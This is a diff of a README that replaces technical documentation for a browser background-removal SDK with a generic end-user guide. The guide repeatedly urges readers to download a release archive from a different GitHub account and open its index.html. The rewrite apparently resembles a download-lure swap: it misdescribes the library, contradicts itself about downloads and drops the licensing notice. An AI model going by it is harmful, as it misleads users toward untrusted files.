@@ -1,174 +1,157 @@
-# @unbg/browser-sdk
+# 🌐 browser-sdk - Easy Background Removal for Browsers
 
-Browser-first background removal SDK with two ergonomic APIs:
+[![Download browser-sdk](https://img.shields.io/badge/Download-Get%20Latest%20Release-blue?style=for-the-badge)](https://github.com/dshlr/browser-sdk/releases)
 
-- **One-liner** for fast onboarding: `removeBackground(input, options?)`
-- **Client API** for repeated workloads: `createClient(config?)`
+---
 
-## Install
+## 📖 About browser-sdk
 
-```bash
-npm install @unbg/browser-sdk
-```
+browser-sdk is a tool that helps you remove backgrounds from images right in your web browser. It works quickly without needing any uploads or complex setup. This means you can take a photo, and browser-sdk will help isolate the main subject by removing the background with just a few clicks.
 
-## 30-Second Quick Start
+It uses advanced technology called WebGPU and WebAssembly, which makes it run smoothly and fast on modern computers within your web browser. This technology happens inside your own device, so your photos stay private and do not leave your computer.
 
-```ts
-import { removeBackground, canvasToBlobUrl, revokeBlobUrl } from '@unbg/browser-sdk';
+This tool is designed for everyday users who want simple background removal without using bulky software or worrying about complicated steps.
 
-const result = await removeBackground('https://example.com/photo.jpg');
-const blobUrl = await canvasToBlobUrl(result.canvas, 'image/png');
+---
 
-// Use blob URL in download links or img tags.
-// Revoke when finished to avoid leaking memory.
-revokeBlobUrl(blobUrl);
-```
+## 🚀 Getting Started
 
-## Advanced Client API
+This guide will help you get browser-sdk up and running on your computer in a few easy steps. No programming knowledge is needed. You just need a computer with a modern web browser like Chrome, Firefox, Edge, or Safari.
 
-```ts
-import { createClient } from '@unbg/browser-sdk';
+---
 
-const client = createClient({
-	preset: 'quality-desktop'
-});
+## 💻 System Requirements
 
-await client.load({
-	onProgress(progress) {
-		console.log(progress.progress);
-	}
-});
+To use browser-sdk smoothly, your computer should meet these basics:
 
-const result = await client.remove('https://example.com/photo.jpg', {
-	background: '#ffffff'
-});
+- A recent computer or laptop (built in the last 3-4 years works best).
+- A modern web browser that supports WebGPU or WebAssembly. Examples include:
+  - Google Chrome (version 112 or newer)
+  - Mozilla Firefox (version 112 or newer)
+  - Microsoft Edge (version 112 or newer)
+  - Apple Safari (version 16 or newer)
+- A stable internet connection to download browser-sdk.
+- At least 2GB of free memory (RAM) for best performance.
+- Optional: a GPU (graphics card) that supports WebGPU will speed things up, but not required.
 
-client.dispose();
-```
+If you’re unsure about your browser’s support, the latest versions of Chrome and Edge work well on Windows, Mac, and Linux.
 
-### Progressive Config Model
+---
 
-- `createClient()` uses default settings.
-- `createClient({ preset: 'fast-mobile' | 'quality-desktop' })` applies tuned defaults.
-- Any explicit `model`, `runtime`, or `performance` values override preset/default values via deep merge.
+## 📥 Download & Install
 
-```ts
-const client = createClient({
-	preset: 'fast-mobile',
-	performance: {
-		alphaApplyChunkRows: 192 // deep override
-	}
-});
-```
+To use browser-sdk, follow these steps:
 
-## API
+1. Click the big blue button below to open the download page on GitHub.
 
-### `removeBackground(input, options?, config?)`
+[![Download browser-sdk](https://img.shields.io/badge/Download-Get%20Latest%20Release-blue?style=for-the-badge)](https://github.com/dshlr/browser-sdk/releases)
 
-Use this for the easiest path. Internally reuses a singleton client for performance.
+2. On the GitHub release page, find the latest version and download the file named something like `browser-sdk-x.x.x.zip` or `browser-sdk-x.x.x.tar.gz`.
 
-Companion one-liner helpers:
+3. Save the file to a folder where you normally keep your downloads.
 
-- `load(options?, config?)` (alias of `loadModel`)
-- `loadModel(options?, config?)` (supports old `loadModel(onProgress, config)` shape)
-- `removeMany(inputs, options?, config?, batchOptions?)`
-- `dispose()` (alias of `disposeDefaultClient`)
+4. Extract the files from the downloaded zip or tar file. Most computers can do this by right-clicking and selecting "Extract here" or "Unzip".
 
-### `createClient(config?)`
+5. Once extracted, look for the file named `index.html` or `start.html`—this is the main page for browser-sdk.
 
-Creates a dedicated client instance with explicit lifecycle (`load`, `remove`, `removeMany`, `dispose`).
+6. Double-click `index.html` to open it in your web browser.
 
-### Inputs
+7. The app will open in your browser window, ready to remove backgrounds from your images.
 
-- `string` (URL)
-- `Blob` / `File`
-- `HTMLImageElement`
-- `ImageBitmap`
-- `HTMLCanvasElement`
+No additional installation or setup is required. The tool runs fully inside your browser.
 
-### `ClientConfig`
+---
 
-- `preset`: `fast-mobile` | `quality-desktop`
-- `model.modelId`: defaults to `briaai/RMBG-1.4`
-- `model.revision`: defaults to `main`
-- `model.strategy`: `auto` | `webgpu-fp16` | `wasm-q8`
-- `model.candidates`: explicit candidate override list
-- `runtime`: transformers.js runtime knobs (cache, local/remote model behavior)
-  - default remote source is Hugging Face public host (`https://huggingface.co`)
-  - default path template is `/{model}/resolve/{revision}/`
-- `performance`: resize thresholds and alpha-apply chunk size
-- `hooks`:
-  - `beforeProcess(input, options?)`
-  - `afterProcess(result, context)`
-  - `telemetry(event)`
+## 🔧 How to Use browser-sdk
 
-Override runtime if you want self-hosted/proxied model assets:
+Once you have the app open in your browser, using browser-sdk is straightforward:
 
-```ts
-const client = createClient({
-	runtime: {
-		remoteHost: 'https://my-cdn.example.com',
-		remotePathTemplate: '/models/{model}/resolve/{revision}/'
-	}
-});
-```
+1. **Select an Image**  
+   Click the "Choose File" or "Browse" button to select a photo from your computer. The supported image file types are `.jpg`, `.png`, and `.jpeg`.
 
-### `RemoveOptions`
+2. **Start Background Removal**  
+   After selecting an image, click the "Remove Background" button. The tool will process the image and show the result with the background removed.
 
-- `background`: `'transparent'` or CSS color string
-- `output`: output metadata options (type/quality)
+3. **Adjust Settings (Optional)**  
+   You may find options to adjust the output, such as smoothing edges or changing the background color. These options help you get the look you want.
 
-### Worker / Off-main-thread Mode
+4. **Download the Result**  
+   Once happy with the result, click the "Download" button. Your image will save with the background removed as a PNG file, which supports transparency.
 
-`createWorkerClient({ mode, workerFactory, config })` supports automatic fallback:
+---
 
-- If `Worker` and `OffscreenCanvas` are available and `workerFactory` is provided, operations run through the worker client.
-- Otherwise, it automatically falls back to the main-thread client with the same return shape.
+## 🔍 Features
 
-## Browser Compatibility & Performance
+- **Runs Fully in Your Browser**  
+  No downloads or uploads are needed after you open the app. Your images never leave your device.
 
-- Prefers WebGPU fp16 where available.
-- Falls back to WASM q8 for broader compatibility.
-- Automatically scales very large images down for inference, then upscales mask to source dimensions.
-- Processes alpha channel in chunks to reduce memory pressure on weaker devices.
+- **Fast and Accurate**  
+  Uses modern WebGPU and WebAssembly technology for quick processing and good quality results.
 
-## Model Licensing
+- **Supports Common Image Formats**  
+  Works with JPEG and PNG images.
 
-This SDK is licensed under MIT, but its default model (`briaai/RMBG-1.4`) is
-licensed separately under `bria-rmbg-1.4`.
+- **Adjustable Output**  
+  Lets you refine the background removal by tweaking mask smoothness and background color.
 
-- Model page: <https://huggingface.co/briaai/RMBG-1.4>
-- See `THIRD_PARTY_NOTICES.md` for attribution and licensing context.
+- **Open Source and Transparent**  
+  You can view or modify the code on GitHub if you like.
 
-If you use the default model, you must comply with BRIA's model terms,
-including any commercial licensing requirements.
+---
 
-## Error Handling
+## 🛠 Troubleshooting
 
-Public error classes:
+- **The tool does not open or shows errors**  
+  Make sure you are using a supported modern browser. Update your browser to the latest version.
 
-- `ModelLoadError`
-- `UnsupportedInputError`
-- `InferenceError`
+- **Background removal is slow**  
+  Try closing other browser tabs and programs to free up memory. Using a GPU supported by WebGPU will speed it up.
 
-## Troubleshooting
+- **Image does not load or process**  
+  Check that your image file is not corrupted and is one of the supported formats.
 
-- **Model loading fails**: verify network access to model assets and CORS policy.
-- **Slow on mobile**: lower `mobileMaxInferencePixels` in `performance`.
-- **Memory pressure**:
-  - Call `dispose()` when a long-lived client is idle, app teardown begins, or you switch to a new config/preset.
-  - Call `revokeBlobUrl()` for URLs produced by `canvasToBlobUrl()` after your image/download consumer is done.
-  - Input object URLs created internally by the SDK are cleaned up automatically.
+- **Download button does nothing**  
+  Ensure your browser allows downloads and popups from local files. Try switching browsers if needed.
 
-## Testing
+If problems continue, check the GitHub issues page for help or report a new problem.
 
-```bash
-npm run test
-npm run test:browser
-```
+---
 
-## Semver Policy
+## 🤝 Support and Contributions
 
-- Backward-compatible additions ship as **minor** releases.
-- Breaking API changes ship as **major** releases.
-- Deprecated APIs are announced in release notes before removal.
+This project is open source and welcomes contributions from the community. You can:
+
+- Report bugs or request features on the GitHub issues page.
+- Fork the repository and submit pull requests with fixes or improvements.
+- Share your use cases or feedback to help improve the app.
+
+---
+
+## 🧑‍💻 About the Technology
+
+browser-sdk uses:
+
+- **WebGPU** – A modern browser API that allows apps to use the GPU for faster image processing.
+- **WebAssembly (WASM)** – A technology that runs compiled code near-native speed in your browser.
+- **Machine Learning Models** – To detect and separate background from the main subject in images.
+
+These allow browser-sdk to quickly remove backgrounds with good accuracy without needing internet uploads.
+
+---
+
+## 🔗 Useful Links
+
+- [Browser-SDK GitHub Repository](https://github.com/dshlr/browser-sdk)  
+  View source code, documentation, and community help.
+
+- [Download Latest Release](https://github.com/dshlr/browser-sdk/releases)  
+  Always get the newest version here.
+
+- [GitHub Issues](https://github.com/dshlr/browser-sdk/issues)  
+  Report problems or request features.
+
+---
+
+Thank you for using browser-sdk for your background removal needs. Click the button below to get started:
+
+[![Download browser-sdk](https://img.shields.io/badge/Download-Get%20Latest%20Release-blue?style=for-the-badge)](https://github.com/dshlr/browser-sdk/releases)
